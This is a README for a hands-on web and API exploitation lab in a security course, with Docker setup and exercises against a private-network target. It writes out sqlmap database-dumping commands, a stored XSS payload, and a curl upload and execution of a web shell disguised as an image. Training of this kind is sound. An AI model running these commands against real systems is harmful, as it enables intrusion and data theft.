# Unit 3 - Explotación Web y APIs 2026

## Objectives

1. Master web application exploitation techniques
2. Learn API security testing
3. Identify and exploit SQL injection vulnerabilities
4. Learn cross-site scripting (XSS) attacks
5. Understand modern authentication vulnerabilities

## Tools Included

- **Kali Linux**: Penetration testing distribution
- **OWASP ZAP**: Web vulnerability scanner
- **Burp Suite**: Web vulnerability scanner
- **SQLMap**: SQL injection tool
- **XSSER**: XSS attack tool

## Lab Setup

### Build and Start Containers

```bash
cd docker-labs/unit3
docker-compose up -d
```

### Access the Lab

1. **Web Interface**: http://localhost:8082 (Kali Desktop via noVNC)
2. **SSH Access**:
   ```bash
   ssh root@localhost -p 2224
   Password: toor
   ```

### Stop and Cleanup

```bash
cd docker-labs/unit3
docker-compose down

# Remove volumes (deletes all data)
docker-compose down -v
```

## Lab Exercises

### Exercise 1: SQL Injection

1. Test for SQL injection with SQLMap:
   ```bash
   sqlmap -u "http://192.168.0.103/login?username=admin&password=test" --dbs
   ```

2. Dump database contents:
   ```bash
   sqlmap -u "http://192.168.0.103/login?username=admin&password=test" -D testdb --tables
   ```

### Exercise 2: Cross-Site Scripting

1. Test for XSS vulnerabilities:
   ```bash
   xsser -u "http://192.168.0.103/search?query=test" -g
   ```

2. Inject stored XSS payload:
   ```bash
   curl -X POST http://192.168.0.103/comments \
     -d 'comment=<script>alert("XSS")</script>' \
     -H "Content-Type: application/x-www-form-urlencoded"
   ```

### Exercise 3: API Testing

1. Test API endpoints with ZAP:
   ```bash
   zap-cli quick-scan -r -s xss,sql-injection http://192.168.0.103/api
   ```

2. Test for broken authentication:
   ```bash
   curl -X GET http://192.168.0.103/api/users/1
   ```

### Exercise 4: File Upload Vulnerabilities

1. Upload a malicious file:
   ```bash
   curl -X POST http://192.168.0.103/upload \
     -F "file=@shell.php;type=image/png" \
     -F "submit=Upload"
   ```

2. Execute the uploaded file:
   ```bash
   curl http://192.168.0.103/uploads/shell.php
   ```

## Resources

- [OWASP Top 10](https://owasp.org/Top10/)
- [SQLMap Documentation](https://sqlmap.org/)
- [OWASP ZAP Documentation](https://www.zaproxy.org/docs/)
- [API Security Best Practices](https://owasp.org/www-project-api-security/)

## Troubleshooting

### Cannot connect to target URL

Check network connectivity:
```bash
cd docker-labs/unit3
docker exec -it kali ping 192.168.0.103
```

### SQLMap isn't finding vulnerabilities

Try different injection techniques:
```bash
sqlmap -u "http://192.168.0.103/login?username=admin&password=test" --technique=B --level=5 --risk=3
```
